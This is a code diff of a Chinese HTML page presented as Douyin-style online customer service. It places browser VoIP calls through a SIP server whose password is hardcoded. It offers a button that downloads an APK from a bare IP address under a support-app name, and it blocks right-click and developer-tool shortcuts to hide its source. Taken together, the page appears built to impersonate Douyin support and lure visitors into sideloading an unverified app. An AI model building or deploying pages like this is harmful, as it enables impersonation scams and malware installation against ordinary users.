@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>网页呼叫客服 - 抖音风格</title>
   <style>
     body {
@@ -13,18 +13,18 @@
       height: 100vh;
       user-select: none;
       color: #333;
+      flex-direction: column;
     }
     .container {
       background: #fff;
       width: 360px;
       max-width: 95vw;
       border-radius: 30px;
-      padding: 30px 20px 60px; /* 为版权预留空间 */
+      padding: 30px 20px;
       box-shadow: 0 15px 30px rgba(0,0,0,0.3);
       display: flex;
       flex-direction: column;
       align-items: center;
-      position: relative;
     }
     .avatar {
       width: 100px;
@@ -109,19 +109,18 @@
       display: none;
     }
     .copyright {
-      position: absolute;
-      bottom: 10px;
-      font-size: 12px;
-      color: #888;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #eee;
       text-align: center;
-      width: 100%;
+      user-select: none;
     }
   </style>
 </head>
-<body>
+<body oncontextmenu="return false" onkeydown="return preventF12(event)">
   <div class="container">
     <div class="avatar">
-      <img src="https://img.zcool.cn/community/01f87c5d04f5c2a801211d539479a2.jpg" alt="客服头像" />
+      <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
     </div>
 
     <h1>欢迎来到在线客服中心</h1>
@@ -132,119 +131,117 @@
 
     <div id="callStatus">未呼叫</div>
     <audio id="audioRemote" autoplay></audio>
-
-    <div class="copyright">© 2025 Douyin Technology 版权所有</div>
   </div>
+
+  <div class="copyright">© 2025 DouCall 抖音呼叫系统版权所有</div>
 
   <!-- JsSIP 和 adapter -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
 
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
+    const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');
+    const configuration = {
+      sockets: [socket],
+      uri: 'sip:80000@xin.anjre.cn',
+      password: 'Aa6363463@',
+      display_name: '网页客户',
+      session_timers: false,
+      register: true
+    };
+    const ua = new JsSIP.UA(configuration);
+    let session = null;
+    let isCalling = false;
 
-      const configuration = {
-        sockets: [socket],
-        uri: 'sip:80000@xin.anjre.cn',
-        password: 'Aa6363463@',
-        display_name: '网页客户',
-        session_timers: false,
-        register: true
-      };
+    ua.on('connected', () => console.log('✅ 已连接到 SIP WebSocket'));
+    ua.on('registered', () => console.log('✅ 注册成功'));
+    ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
+    ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
+    ua.start();
 
-      const ua = new JsSIP.UA(configuration);
-      let session = null;
-      let isCalling = false;
+    const callButton = document.getElementById('callButton');
+    const hangupButton = document.getElementById('hangupButton');
+    const statusDisplay = document.getElementById('callStatus');
+    const remoteAudio = document.getElementById('audioRemote');
 
-      ua.on('connected', () => console.log('✅ 已连接到 SIP WebSocket'));
-      ua.on('registered', () => console.log('✅ 注册成功'));
-      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
-      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
-      ua.start();
+    function updateStatus(text) {
+      statusDisplay.textContent = text;
+    }
 
-      const callButton = document.getElementById('callButton');
-      const hangupButton = document.getElementById('hangupButton');
-      const statusDisplay = document.getElementById('callStatus');
-      const remoteAudio = document.getElementById('audioRemote');
+    window.makeCall = function () {
+      if (isCalling) return;
 
-      function updateStatus(text) {
-        statusDisplay.textContent = text;
-      }
+      isCalling = true;
+      callButton.disabled = true;
+      hangupButton.disabled = false;
+      updateStatus("正在呼叫...");
 
-      window.makeCall = function () {
-        if (isCalling) return;
-
-        isCalling = true;
-        callButton.disabled = true;
-        hangupButton.disabled = false;
-        updateStatus("正在呼叫...");
-
-        session = ua.call('sip:10011@xin.anjre.cn', {
-          mediaConstraints: { audio: true, video: false },
-          rtcOfferConstraints: {
-            offerToReceiveAudio: 1,
-            offerToReceiveVideo: 0
-          }
-        });
-
-        session.connection.addEventListener('track', function (event) {
-          if(event.streams && event.streams[0]) {
-            remoteAudio.srcObject = event.streams[0];
-            remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
-          }
-        });
-
-        session.on('progress', () => updateStatus("振铃中..."));
-        session.on('accepted', () => updateStatus("通话中"));
-        session.on('ended', () => {
-          updateStatus("通话结束");
-          resetUI();
-        });
-        session.on('failed', (e) => {
-          updateStatus("呼叫失败");
-          console.error('呼叫失败:', e);
-          resetUI();
-        });
-      };
-
-      window.hangupCall = function () {
-        if (session) {
-          session.terminate();
+      session = ua.call('sip:10011@xin.anjre.cn', {
+        mediaConstraints: { audio: true, video: false },
+        rtcOfferConstraints: {
+          offerToReceiveAudio: 1,
+          offerToReceiveVideo: 0
         }
-      };
-
-      function resetUI() {
-        isCalling = false;
-        callButton.disabled = false;
-        hangupButton.disabled = true;
-        session = null;
-      }
-
-      const downloadApkButton = document.getElementById('downloadApkButton');
-      downloadApkButton.addEventListener('click', () => {
-        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'Android_客服通.apk';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
       });
+
+      session.connection.addEventListener('track', function (event) {
+        if(event.streams && event.streams[0]) {
+          remoteAudio.srcObject = event.streams[0];
+          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
+        }
+      });
+
+      session.on('progress', () => updateStatus("振铃中..."));
+      session.on('accepted', () => updateStatus("通话中"));
+      session.on('ended', () => {
+        updateStatus("通话结束");
+        resetUI();
+      });
+      session.on('failed', (e) => {
+        updateStatus("呼叫失败");
+        console.error('呼叫失败:', e);
+        resetUI();
+      });
+    };
+
+    window.hangupCall = function () {
+      if (session) {
+        session.terminate();
+      }
+    };
+
+    function resetUI() {
+      isCalling = false;
+      callButton.disabled = false;
+      hangupButton.disabled = true;
+      session = null;
+    }
+
+    // 下载APK
+    document.getElementById('downloadApkButton').addEventListener('click', () => {
+      const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'Android_客服通.apk';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     });
 
-    // 禁用右键和常见调试快捷键
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
+    // 防止F12和调试
+    function preventF12(e) {
       if (
-        e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
+        e.key === 'F12' ||
+        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
         (e.ctrlKey && e.key === 'U')
       ) {
         e.preventDefault();
-        alert('为了您的安全，调试功能已禁用。');
+        return false;
       }
-    });
+    }
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', preventF12);
   </script>
 </body>
 </html>
